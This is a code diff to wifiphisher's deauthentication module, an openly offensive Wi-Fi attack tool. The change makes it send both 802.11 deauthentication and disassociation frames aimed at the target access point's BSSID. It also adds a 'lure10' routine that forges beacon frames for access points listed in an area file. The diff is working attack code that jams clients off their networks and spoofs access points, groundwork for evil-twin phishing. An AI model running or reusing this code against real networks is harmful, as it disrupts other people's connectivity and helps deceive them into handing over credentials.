@@ -6,6 +6,7 @@ Sends 3 DEAUTH Frames:
 """
 
 import threading
+import struct
 import scapy.layers.dot11 as dot11
 import scapy.arch.linux as linux
 import wifiphisher.common.constants as constants
@@ -45,8 +46,8 @@ class Deauthentication(object):
 
     def _craft_and_add_packet(self, sender, receiver):
         """
-        Craft a deauthentication packet and add it to the list of
-        deauthentication packets
+        Craft a deauthentication and a disassociation packet and add
+        them to the list of deauthentication packets
 
         :param self: A Deauthentication object
         :param sender: The MAC address of the sender
@@ -58,11 +59,16 @@ class Deauthentication(object):
         :rtype: None
         """
 
-        packet = (dot11.RadioTap() / dot11.Dot11(type=0, subtype=12, \
-                    addr1=receiver, addr2=sender, addr3=sender) \
+        deauth_packet = (dot11.RadioTap() / dot11.Dot11(type=0, subtype=12, \
+                    addr1=receiver, addr2=sender, addr3=self._ap_bssid) \
                   / dot11.Dot11Deauth())
 
-        self._deauthentication_packets.append(packet)
+        disassoc_packet = (dot11.RadioTap() / dot11.Dot11(type=0, subtype=10, \
+                    addr1=receiver, addr2=sender, addr3=self._ap_bssid) \
+                  / dot11.Dot11Disas())
+        
+        self._deauthentication_packets.append(disassoc_packet)
+        self._deauthentication_packets.append(deauth_packet)
 
     def _process_packet(self, packet):
         """
@@ -124,6 +130,26 @@ class Deauthentication(object):
         while self._should_continue:
             dot11.sniff(iface=self._jamming_interface, prn=self._process_packet,
                         count=1, store=0)
+
+    def add_lure10_beacons(self, area_file):
+        
+        with open(area_file) as f:
+            wlans = [x.strip() for x in f.readlines()]
+            for w in wlans:
+                bssid, essid = w.split(' ', 1)
+                # Frequency for channel 7
+                frequency = struct.pack("<h", 2407 + 7*5)
+                ap_rates = "\x0c\x12\x18\x24\x30\x48\x60\x6c"
+                frame =  dot11.RadioTap(len=18, present='Flags+Rate+Channel+dBm_AntSignal+Antenna', \
+                                 notdecoded='\x00\x6c' + frequency + \
+                                 '\xc0\x00\xc0\x01\x00\x00') \
+                / dot11.Dot11(subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid) \
+                / dot11.Dot11Beacon(cap=0x2105) \
+                / dot11.Dot11Elt(ID='SSID', info="") \
+                / dot11.Dot11Elt(ID='Rates', info=ap_rates) \
+                / dot11.Dot11Elt(ID='DSset', info=chr(7))
+
+                self._deauthentication_packets.append(frame)
 
     def get_clients(self):
         """
